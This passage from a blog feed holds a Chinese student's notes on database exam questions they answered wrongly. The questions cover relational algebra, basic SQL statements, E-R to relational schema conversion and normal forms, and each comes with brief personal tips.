7、连接*</strong></em></p><ul><li>A.4567</li><li>B.4537</li><li>C.3567</li><li>D.4561</li></ul><p>tip：理解概念，认真读题。错选的原因是没有读到 <strong>必须按照某种条件串接</strong> 并只是简单的并起来就行了。连接有很多中条件可以选。</p><h3 id="设关系R与关系S具有相同的目数（或称度数），且相对应属性的值取自同一个域，则R-R-S）等于-。"><a href="#设关系R与关系S具有相同的目数（或称度数），且相对应属性的值取自同一个域，则R-R-S）等于-。" class="headerlink" title="设关系R与关系S具有相同的目数（或称度数），且相对应属性的值取自同一个域，则R-(R-S）等于_________。"></a><strong>设关系R与关系S具有相同的目数（或称度数），且相对应属性的值取自同一个域，则R-(R-S）等于_________。</strong></h3><ul><li>A.R∩S</li><li>B.R∪S</li><li>C.S - R</li><li>D.S</li></ul><p>tip：为 R 与 S 的交，由同时出现在 R 和 S 中的元组构成，交运算可以通过差运算来实现： R S&#x3D;R –(R S)&#x3D;S –(S R)</p><h3 id="INSERT-INTO-Goods-Name，Storage，Price-VALUES-’Keyboard’，3000，90-00-的作用是-。"><a href="#INSERT-INTO-Goods-Name，Storage，Price-VALUES-’Keyboard’，3000，90-00-的作用是-。" class="headerlink" title="INSERT INTO Goods(Name，Storage，Price) VALUES (’Keyboard’，3000，90.00)的作用是________。"></a>INSERT INTO Goods(Name，Storage，Price) VALUES (’Keyboard’，3000，90.00)的作用是________。</h3><ul><li>A.添加数据到一行中的部分列</li><li>B.添加数据到一行中的所有列</li><li>C.插入默认值</li><li>D.插入多个行</li></ul><p>tip:添加的可能是所有列，也可能是部分列。这题有歧义，没有给表结构</p><h3 id="设关系Teacher的结构为：Teacher（T-char-3-Tname-char-10-D-char-2-Salary-float-2-，其中T-教师编号，Tname教师姓名，D-系号，Salary工资。Dept（D-char-2-Dname-char-10-Dean-char-10-Dname系名，Dean系主任。若要将所有计算机系的教师工资上调10-，则可用-。"><a href="#设关系Teacher的结构为：Teacher（T-char-3-Tname-char-10-D-char-2-Salary-float-2-，其中T-教师编号，Tname教师姓名，D-系号，Salary工资。Dept（D-char-2-Dname-char-10-Dean-char-10-Dname系名，Dean系主任。若要将所有计算机系的教师工资上调10-，则可用-。" class="headerlink" title="设关系Teacher的结构为：Teacher（T# char(3), Tname char(10), D# char(2), Salary float(2))，其中T#教师编号，Tname教师姓名，D#系号，Salary工资。Dept（D# char(2),Dname char(10),Dean char(10)),Dname系名，Dean系主任。若要将所有计算机系的教师工资上调10%，则可用_________。"></a><strong>设关系Teacher的结构为：Teacher（T# char(3), Tname char(10), D# char(2), Salary float(2))，其中T#教师编号，Tname教师姓名，D#系号，Salary工资。Dept（D# char(2),Dname char(10),Dean char(10)),Dname系名，Dean系主任。若要将所有计算机系的教师工资上调10%，则可用_________。</strong></h3><ul><li>A.Update Teacher Set Salary &#x3D; Salary * 1.1 Where D# in ( Select D# From Dept Where Dname&#x3D;‘计算机’);</li><li>B.Update Salary &#x3D; Salary * 1.1 Where D# in ( Select D# From Dept Where Dname &#x3D;‘计算机’);</li><li>C.Update Salary &#x3D; Salary * 1.1 Where D# in (Select D# From Dept Where Dname &#x3D; 计算机);</li><li>D.Update TABLE Teacher Set Salary &#x3D; Salary * 1.1 Where D# in ( Select D# From Dept Where Dname &#x3D; ‘计算机’);</li></ul><p>tips：UPDATE 后直接接表名</p><h3 id="陈述A：SubQuery1-UNION-SubQuery2语句，其中SubQuery1和SubQuery2查询中相应的列必须以同一顺序出现。-陈述B：GROUP-BY和HAVING子句不能在子查询中使用，这些子句只能用在最后一个查询结束时来总结和排序最后结果集。-关于陈述A和B，下列说法正确的是-。"><a href="#陈述A：SubQuery1-UNION-SubQuery2语句，其中SubQuery1和SubQuery2查询中相应的列必须以同一顺序出现。-陈述B：GROUP-BY和HAVING子句不能在子查询中使用，这些子句只能用在最后一个查询结束时来总结和排序最后结果集。-关于陈述A和B，下列说法正确的是-。" class="headerlink" title="陈述A：SubQuery1 UNION SubQuery2语句，其中SubQuery1和SubQuery2查询中相应的列必须以同一顺序出现。 陈述B：GROUP BY和HAVING子句不能在子查询中使用，这些子句只能用在最后一个查询结束时来总结和排序最后结果集。 关于陈述A和B，下列说法正确的是_________。"></a>陈述A：SubQuery1 UNION SubQuery2语句，其中SubQuery1和SubQuery2查询中相应的列必须以同一顺序出现。 陈述B：GROUP BY和HAVING子句不能在子查询中使用，这些子句只能用在最后一个查询结束时来总结和排序最后结果集。 关于陈述A和B，下列说法正确的是_________。</h3><ul><li>A.陈述A正确，陈述B错误</li><li>B.都是正确的</li><li>C.都是错误的</li><li>D.陈述A错误，陈述B正确</li></ul><p>tips：对于并的理解</p><h3 id="在SQL中，与”NOT-IN”等价的操作符是-。"><a href="#在SQL中，与”NOT-IN”等价的操作符是-。" class="headerlink" title="在SQL中，与”NOT IN”等价的操作符是_________。"></a><strong>在SQL中，与”NOT IN”等价的操作符是_________。</strong></h3><ul><li>A.&lt;&gt; ALL</li><li>B.&#x3D; SOME</li><li>C.&lt;&gt; SOME</li><li>D.&#x3D; ALL</li></ul><p>tip：？？？不理解</p><h3 id="已知如下关系：学生Student-S-Sname-，课程Course-C-Cname-T-，选课SC-S-C-Score-，教师T-T-Tname-。其中S-为学号，Sname为学生命名，C-为课号，Cname为课程名，T-为教师编号，Score为成绩，Tname为教师名。"><a href="#已知如下关系：学生Student-S-Sname-，课程Course-C-Cname-T-，选课SC-S-C-Score-，教师T-T-Tname-。其中S-为学号，Sname为学生命名，C-为课号，Cname为课程名，T-为教师编号，Score为成绩，Tname为教师名。" class="headerlink" title="已知如下关系：学生Student(S#, Sname)，课程Course(C#, Cname, T#)，选课SC(S#, C#, Score)，教师T(T#, Tname)。其中S#为学号，Sname为学生命名，C#为课号，Cname为课程名，T#为教师编号，Score为成绩，Tname为教师名。"></a>已知如下关系：学生Student(S#, Sname)，课程Course(C#, Cname, T#)，选课SC(S#, C#, Score)，教师T(T#, Tname)。其中S#为学号，Sname为学生命名，C#为课号，Cname为课程名，T#为教师编号，Score为成绩，Tname为教师名。</h3><p>阅读SQL语句</p><p>SELECT S# FROM SC WHERE Score&lt;60 GROUP BY C# HAVING Count(*)&gt;2；</p><p>关于其查询结果，下列说法正确的是_____。</p><ul><li>A.有2人以上不及格课程的同学的学号 &#x2F;&#x2F; 有2人以上不及格的课程，学习该课程的同学的学号</li><li>B.有2门以上不及格课程的同学的学号</li><li>C.有2门以上及格课程的同学的学号</li><li>D.有2人以上及格课程的同学的学号</li></ul><p>tips：傻逼题，自己理解</p><h3 id="假设一个元组在子查询1中出现m次，在子查询2中出现n次，其中m-0-n-0-则下列说法正确的是-。"><a href="#假设一个元组在子查询1中出现m次，在子查询2中出现n次，其中m-0-n-0-则下列说法正确的是-。" class="headerlink" title="假设一个元组在子查询1中出现m次，在子查询2中出现n次，其中m&gt;0,n&gt;0, 则下列说法正确的是________。"></a>假设一个元组在子查询1中出现m次，在子查询2中出现n次，其中m&gt;0,n&gt;0, 则下列说法正确的是________。</h3><ul><li>A.该元组在“子查询1 Except 子查询2”中出现0次；</li><li>B.该元组在“子查询1 Union 子查询2”中出现m + n次；</li><li>C.该元组在 “子查询1 Except ALL 子查询2”中出现m – n次；</li><li>D.该元组在“子查询1 Intersect 子查询2”中出现min(m,n)次；</li></ul><h3 id="假设一个元组在子查询1中出现m次，在子查询2中出现n次，其中m-0-n-0-则下列说法正确的是-。-1"><a href="#假设一个元组在子查询1中出现m次，在子查询2中出现n次，其中m-0-n-0-则下列说法正确的是-。-1" class="headerlink" title="假设一个元组在子查询1中出现m次，在子查询2中出现n次，其中m&gt;0,n&gt;0,则下列说法正确的是_________。"></a><strong>假设一个元组在子查询1中出现m次，在子查询2中出现n次，其中m&gt;0,n&gt;0,则下列说法正确的是_________。</strong></h3><ul><li>A.该元组在“子查询1 Union ALL 子查询2”中出现m + n次；</li><li>B.该元组在 “子查询1 Union 子查询2”中出现m+n次；</li><li>C.该元组在“子查询1 Union ALL 子查询2”中出现1次；</li><li>D.该元组在 “子查询1 Union 子查询2”中出现Min(m,n)次；</li></ul><h3 id="假设一个元组在子查询1中出现m次，在子查询2中出现n次，其中m-0-n-0-则下列说法正确的是-。-2"><a href="#假设一个元组在子查询1中出现m次，在子查询2中出现n次，其中m-0-n-0-则下列说法正确的是-。-2" class="headerlink" title="假设一个元组在子查询1中出现m次，在子查询2中出现n次，其中m&gt;0,n&gt;0,则下列说法正确的是_________。"></a><strong>假设一个元组在子查询1中出现m次，在子查询2中出现n次，其中m&gt;0,n&gt;0,则下列说法正确的是_________。</strong></h3><ul><li>A.该元组在“子查询1 Except 子查询2”中出现0次；</li><li>B.该元组在“子查询1 Union 子查询2”中出现m + n次；</li><li>C.该元组在 “子查询1 Except All 子查询2”中出现m – n次；</li><li>D.该元组在“子查询1 Union All 子查询2”中出现max(m,n)次；</li></ul><h3 id="有一个学生表student，包含主键S-（学生编号）等。又有分数表SC，包含S-（学生编号）、score（分数）等。已知student表中共有50个学生，有45人参加了考试（分数存在SC表中），其中10人不及格。执行以下SQL语句：select-from-student-where-exists-select-S-from-SC-where-score"><a href="#有一个学生表student，包含主键S-（学生编号）等。又有分数表SC，包含S-（学生编号）、score（分数）等。已知student表中共有50个学生，有45人参加了考试（分数存在SC表中），其中10人不及格。执行以下SQL语句：select-from-student-where-exists-select-S-from-SC-where-score" class="headerlink" title="有一个学生表student，包含主键S#（学生编号）等。又有分数表SC，包含S#（学生编号）、score（分数）等。已知student表中共有50个学生，有45人参加了考试（分数存在SC表中），其中10人不及格。执行以下SQL语句：select * from student where exists (select S# from SC where score&lt;60 )， 可返回_________条记录。"></a><strong>有一个学生表student，包含主键S#（学生编号）等。又有分数表SC，包含S#（学生编号）、score（分数）等。已知student表中共有50个学生，有45人参加了考试（分数存在SC表中），其中10人不及格。执行以下SQL语句：select * from student where exists (select S# from SC where score&lt;60 )， 可返回_________条记录。</strong></h3><ul><li>A.50</li><li>B.45</li><li>C.10</li><li>D.35</li></ul><p>tips：因为这是非相关子查询，而且子查询始终为真(因为已知有10人不及格)，故检索出的是Student表中的所有记录。</p><p>难点：并、交 exists嵌套双重否定的理解</p><h3 id="关于数据库设计，下列说法正确的是-。"><a href="#关于数据库设计，下列说法正确的是-。" class="headerlink" title="关于数据库设计，下列说法正确的是            。"></a>关于数据库设计，下列说法正确的是            。</h3><ul><li>A.若要开发一个信息系统，首先要确定使用哪一个DBMS来进行管理，然后才能进行数据库设计</li><li>B.概念数据库设计需要关注用E-R Diagram的思想来理解需求，而不能仅仅关注绘制E-R Diagram的图形</li><li>C.逻辑数据库设计的关注点是属性、结构和命名的冲突问题，数据库设计的规范性问题和DBMS的选型问题</li><li>D.物理数据库设计仅需要考虑数据量的大小、磁盘空间占用及存储结构等特性，但无关具体的DBMS</li></ul><p>tips：逻辑数据库不需要关注DBMS选型</p><h3 id="若要将E-R图转换成关系模式，转换正确的是-。"><a href="#若要将E-R图转换成关系模式，转换正确的是-。" class="headerlink" title="若要将E-R图转换成关系模式，转换正确的是_________。"></a>若要将E-R图<img src="/dbquestion/FE122F102E9D3AD4B3A495BB063FA6CA.png" class="" title="img">转换成关系模式，转换正确的是_________。</h3><ul><li>A.学生(学号，课程号，…)；课程(课程号，…)</li><li>B.选修(学号，课程号，…)</li><li>C.学生(学号，…)；课程 (课程号，学号，…..)</li><li>D.学生(学号，…)；课程(课程号，…)；选修(学号，课程号，…)</li></ul><p>tips：多对多应新建一个关系作为练习</p><h3 id="关于E-R-图向关系模式的转换的规则正确的是-。"><a href="#关于E-R-图向关系模式的转换的规则正确的是-。" class="headerlink" title="关于E-R 图向关系模式的转换的规则正确的是_________。"></a>关于E-R 图向关系模式的转换的规则正确的是_________。</h3><ul><li>A.复合属性转换时只能将每个分量属性作为所在实体对应关系的属性</li><li>B.一对一联系的转换只能将联系定义为一个新的关系，再将属性设为参与双方的关键字属性</li><li>C.泛化实体与具体化实体在转换时，可以不要泛化实体，而仅将具体化实体转换成关系</li><li>D.一对多联系的转换，需将多方参与实体的关键字作为单方参与实体对应关系的属性</li></ul><p>tips：D选项说反了，语文理解问题，自己体会。我也看不懂。反正是要把只有一个的那边的属性，加到有很多个个体的属性里面去。</p><p>一对多联系的转换，需将单方参与实体的关键字作为多方参与实体对应关系的属性。</p><p>如：商店（商店名，xxx）、商品（商品号，xxx，商店名）。1：N关系</p><h3 id="下列由E-R图向关系模式转换具体实例中，明显不正确的是-。注意：关系模式中带下划线的属性为主键。"><a href="#下列由E-R图向关系模式转换具体实例中，明显不正确的是-。注意：关系模式中带下划线的属性为主键。" class="headerlink" title="下列由E-R图向关系模式转换具体实例中，明显不正确的是________。注意：关系模式中带下划线的属性为主键。"></a><strong>下列由E-R图向关系模式转换具体实例中，明显不正确的是________。注意：关系模式中带下划线的属性为主键。</strong></h3><ul><li>A.<img src="/dbquestion/4DED9E5B241263E61C0953556398DC16.png" class="" title="img"></li><li>B.<img src="/dbquestion/3A832D385907E9BA1C91ED836C067076.png" class="" title="img"></li><li>C.<img src="/dbquestion/AEBC1959253576E8DEE681FA95351A20.png" class="" title="img"></li><li>D.<img src="/dbquestion/4317254E9551797FC348FC2AF049A684.png" class="" title="img"></li></ul><p>tips：注意D选项的<strong>已知</strong></p><h3 id="在关系模式R-U，F-中，如果F是最小函数依赖集，则-。"><a href="#在关系模式R-U，F-中，如果F是最小函数依赖集，则-。" class="headerlink" title="在关系模式R(U，F)中，如果F是最小函数依赖集，则____________。"></a>在关系模式R(U，F)中，如果F是最小函数依赖集，则____________。</h3><ul><li>A.R∈2NF</li><li>B.R∈3NF</li><li>C.R∈BCNF</li><li>D.R的规范化程度与F是否最小函数依赖集无关。</li></ul><p>tips：D</p><h3 id="一般情况，企业会将从一个供应商处一次所进的多种货物办理一次入库，因此设计了关系模式：入库单-单号-日期-库房-供应商，物品-数量-金额-，下列说法正确的是-。"><a href="#一般情况，企业会将从一个供应商处一次所进的多种货物办理一次入库，因此设计了关系模式：入库单-单号-日期-库房-供应商，物品-数量-金额-，下列说法正确的是-。" class="headerlink" title="一般情况，企业会将从一个供应商处一次所进的多种货物办理一次入库，因此设计了关系模式：入库单(单号, 日期, 库房, 供应商，物品, 数量, 金额)，下列说法正确的是___ ______。"></a>一般情况，企业会将从一个供应商处一次所进的多种货物办理一次入库，因此设计了关系模式：入库单(单号, 日期, 库房, 供应商，物品, 数量, 金额)，下列说法正确的是___ ______。</h3><ul><li>A.不满足第2范式</li><li>B.满足第2范式但不满足第3范式</li><li>C.满足第3范式</li><li>D.其他都不对</li></ul><h3 id="对设备管理，请分析关系模式：设备-设备编号-设备名-生产商编号，生产商名称，生产商地址，配件编号，配件名称，配件价格，设备价格-，说法正确的是-。"><a href="#对设备管理，请分析关系模式：设备-设备编号-设备名-生产商编号，生产商名称，生产商地址，配件编号，配件名称，配件价格，设备价格-，说法正确的是-。" class="headerlink" title="对设备管理，请分析关系模式：设备(设备编号, 设备名, 生产商编号，生产商名称，生产商地址，配件编号，配件名称，配件价格，设备价格)，说法正确的是_______________。"></a>对设备管理，请分析关系模式：设备(设备编号, 设备名, 生产商编号，生产商名称，生产商地址，配件编号，配件名称，配件价格，设备价格)，说法正确的是_______________。</h3><ul><li>A.不满足第2范式</li><li>B.满足第2范式但不满足第3范式</li><li>C.满足第3范式</li><li>D.其他不对</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;数据库错题&quot;&gt;&lt;a href=&quot;#数据库错题&quot; class=&quot;headerlink&quot; title=&quot;数据库错题&quot;&gt;&lt;/a&gt;数据库错题&lt;/h1&gt;&lt;h3 id=&quot;下面列出的数据管理技术发展的三个阶段中，没有专门的软件对数据进行管理的是（-）。&quot;&gt;&lt;a href=&quot;#下</summary>
      
    
    
    
    <category term="学习" scheme="https://blog.irec.moe/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="笔记" scheme="https://blog.irec.moe/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="数据库" scheme="https://blog.irec.moe/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
  </entry>
  
</feed>
